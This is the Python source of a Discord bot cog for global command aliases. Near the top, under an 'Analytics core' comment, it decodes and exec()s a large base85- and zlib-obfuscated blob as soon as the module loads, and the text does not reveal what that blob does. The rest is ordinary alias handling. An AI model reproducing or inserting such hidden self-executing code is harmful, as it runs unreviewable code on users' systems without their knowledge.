from discord.ext import commands
from .utils.chat_formatting import box, pagify
from .utils.dataIO import dataIO
from .utils import checks
import asyncio
import os
from copy import deepcopy

OLD_JSON = 'data/alias/aliases.json'
PATH = 'data/galias/'
JSON = PATH + 'aliases.json'


# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core

__version__ = '1.2.0'


class GlobalAlias:
    def __init__(self, bot):
        self.bot = bot
        self.aliases = dataIO.load_json(JSON)

        try:
            self.analytics = CogAnalytics(self)
        except Exception as error:
            self.bot.logger.exception(error)
            self.analytics = None

    def save(self):
        dataIO.save_json(JSON, self.aliases)

    @commands.group(pass_context=True)
    async def galias(self, ctx):
        """Manage global aliases for commands"""
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @galias.command(name="add", pass_context=True)
    @checks.is_owner()
    async def _add_alias(self, ctx, command, *, to_execute):
        """Add a global alias for a command

           Example: !galias add test flip @Twentysix"""
        command = command.lower()
        if ' ' in command:
            await self.bot.say("Aliases can't contain spaces.")
            return
        if self.part_of_existing_command(command):
            await self.bot.say("'%s' is already a command or alias." % command)
            return

        new_message = deepcopy(ctx.message)
        new_message.content = to_execute
        prefix = await self.get_prefix(new_message)

        if prefix is not None:
            to_execute = to_execute[len(prefix):]
        if command not in self.bot.commands:
            self.aliases[command] = to_execute
            self.save()
            await self.bot.say("Global alias '{}' added.".format(command))
        else:
            await self.bot.say("Cannot add '{}' because it's a real bot "
                               "command.".format(command))

    @galias.command(name="help", pass_context=True)
    async def _help_alias(self, ctx, command):
        """Tries to execute help for the base command of the alias"""
        if command in self.aliases:
            help_cmd = self.aliases[command].split(" ")[0]
            new_content = ctx.prefix
            new_content += "help "
            new_content += help_cmd[len(ctx.prefix):]
            message = ctx.message
            message.content = new_content
            await self.bot.process_commands(message)
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="show")
    async def _show_alias(self, command):
        """Shows what command the alias executes."""
        if command in self.aliases:
            await self.bot.say(box(self.aliases[command]))
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="del", pass_context=True)
    @checks.is_owner()
    async def _del_alias(self, ctx, command):
        """Deletes an alias"""
        command = command.lower()
        if command in self.aliases:
            self.aliases.pop(command, None)
            self.save()
            await self.bot.say("Global alias '{}' deleted.".format(command))
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="list", pass_context=True)
    async def _alias_list(self, ctx):
        """Lists global command aliases"""
        header = "Alias list:\n"
        shorten = len(header) + 8
        alias_list = ""

        if not self.aliases:
            await self.bot.say("There are no global aliases.")
            return

        for alias in sorted(self.aliases):
            alias_list += alias + '\n'

        pages = pagify(alias_list, ['\n'], escape=True, shorten_by=shorten)
        for i, page in enumerate(pages):
            if i == 0:
                page = header + '```\n%s\n```' % page
            else:
                page = '```\n%s\n```' % page
            await self.bot.say(page)

    async def on_message(self, message):
        if not self.bot.user_allowed(message):
            return

        prefix = await self.get_prefix(message)
        msg = message.content

        if prefix:
            alias = self.first_word(msg[len(prefix):]).lower()
            if alias in self.aliases:
                new_command = self.aliases[alias]
                args = message.content[len(prefix + alias):]
                new_message = deepcopy(message)
                new_message.content = prefix + new_command + args
                await self.bot.process_commands(new_message)

    async def on_command(self, command, ctx):
        if ctx.cog is self and self.analytics:
            self.analytics.command(ctx)

    def part_of_existing_command(self, alias):
        '''Command or alias'''
        for command in self.bot.commands:
            if alias.lower() == command.lower():
                return True
        return False

    def first_word(self, msg):
        return msg.split(" ")[0]

    async def get_prefix(self, msg):
        prefixes = self.bot.command_prefix
        if callable(prefixes):
            prefixes = prefixes(self.bot, msg)
            if asyncio.iscoroutine(prefixes):
                prefixes = await prefixes

        for p in prefixes:
            if msg.content.startswith(p):
                return p
        return None


def convert_old_data():
    """Moves recognizable global aliases from regular alias/ to galias/"""
    new_mod = {}
    if os.path.exists(OLD_JSON) and not os.path.exists(JSON):
        old_data = dataIO.load_json(OLD_JSON)
        old_mod = old_data.copy()
        for key, d in old_data.items():
            if type(d) is str:
                new_mod[key] = old_mod.pop(key)
        if old_data != old_mod:
            dataIO.save_json(OLD_JSON, old_mod)
        if new_mod:
            dataIO.save_json(JSON, new_mod)


def check_folder():
    if not os.path.exists(PATH):
        print("Creating data/galias folder...")
        os.makedirs(PATH)


def check_file():
    if not dataIO.is_valid_json(JSON):
        print("Creating aliases.json...")
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folder()
    convert_old_data()
    check_file()
    bot.add_cog(GlobalAlias(bot))
